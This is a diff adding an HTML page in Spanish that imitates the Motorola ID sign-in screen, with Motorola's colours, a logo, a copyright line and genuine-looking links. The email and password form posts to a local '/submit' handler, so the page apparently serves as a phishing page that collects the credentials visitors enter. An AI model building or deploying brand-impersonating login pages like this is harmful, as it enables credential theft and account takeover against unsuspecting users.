@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Motorola ID - Iniciar sesión</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap');
+        
+        body { 
+            font-family: 'Montserrat', sans-serif; 
+            background-color: #ffffff; 
+        }
+
+        /* Azul característico de Motorola */
+        .moto-blue {
+            background-color: #0076CE;
+        }
+        .moto-blue:hover {
+            background-color: #005fa6;
+        }
+
+        /* Input con el estilo suave de Lenovo/Motorola */
+        .moto-input {
+            border: 1px solid #d1d1d1;
+            border-radius: 8px;
+            transition: all 0.2s ease-in-out;
+        }
+        .moto-input:focus {
+            border-color: #0076CE;
+            box-shadow: 0 0 0 1px #0076CE;
+            outline: none;
+        }
+
+        /* Estilización del nombre Motorola */
+        .moto-logo {
+            color: #4d4d4d;
+            font-weight: 300; /* Motorola usa una fuente delgada */
+            font-size: 2rem;
+            letter-spacing: 1px;
+        }
+        .moto-logo span {
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-6">
+
+    <div class="w-full max-w-[420px]">
+        
+        <div class="flex justify-center mb-10">
+            <h1 class="moto-logo">motorola</h1>
+        </div>
+
+        <div class="bg-white p-2">
+            <h2 class="text-2xl font-semibold text-gray-800 mb-2">Iniciar sesión</h2>
+            <p class="text-gray-500 text-sm mb-8">Usa tu ID de Motorola para continuar</p>
+
+            <form action="/submit" method="POST" class="space-y-5">
+                
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1 uppercase tracking-wider">Correo electrónico</label>
+                    <input type="text" name="username" required
+                        class="moto-input w-full px-4 py-3 text-gray-800 bg-gray-50"
+                        placeholder="ejemplo@correo.com">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1 uppercase tracking-wider">Contraseña</label>
+                    <input type="password" name="password" required
+                        class="moto-input w-full px-4 py-3 text-gray-800 bg-gray-50"
+                        placeholder="Introduce tu contraseña">
+                </div>
+
+                <div class="flex justify-end">
+                    <a href="https://accounts.motorola.com" target="_blank" class="text-[#0076CE] text-sm hover:underline">
+                        ¿Olvidaste la contraseña?
+                    </a>
+                </div>
+
+                <button type="submit" 
+                    class="w-full moto-blue text-white font-bold py-3.5 rounded-lg transition-all shadow-sm mt-2">
+                    INICIAR SESIÓN
+                </button>
+            </form>
+
+            <div class="relative flex py-10 items-center">
+                <div class="flex-grow border-t border-gray-200"></div>
+                <span class="flex-shrink mx-4 text-gray-400 text-xs">O BIEN</span>
+                <div class="flex-grow border-t border-gray-200"></div>
+            </div>
+
+            <a href="https://accounts.google.com" target="_blank"
+                class="flex items-center justify-center gap-3 w-full border border-gray-300 py-3 rounded-lg hover:bg-gray-50 transition-colors mb-4">
+                <img src="https://www.google.com/favicon.ico" class="w-4 h-4" alt="G">
+                <span class="text-gray-700 font-semibold text-sm">Iniciar sesión con Google</span>
+            </a>
+
+            <div class="text-center mt-8">
+                <p class="text-gray-600 text-sm">
+                    ¿No tienes una cuenta? 
+                    <a href="https://accounts.motorola.com" target="_blank" class="text-[#0076CE] font-bold hover:underline ml-1">Regístrate</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <footer class="mt-auto py-8 w-full border-t border-gray-100">
+        <div class="max-w-4xl mx-auto px-4 flex flex-col md:flex-row justify-between items-center text-[11px] text-gray-400 gap-4">
+            <div class="flex gap-4">
+                <a href="#" class="hover:underline">Privacidad</a>
+                <a href="#" class="hover:underline">Condiciones de uso</a>
+                <a href="#" class="hover:underline">Ayuda</a>
+            </div>
+            <p>© 2026 Motorola Mobility LLC. Todos los derechos reservados.</p>
+        </div>
+    </footer>
+
+</body>
+</html>
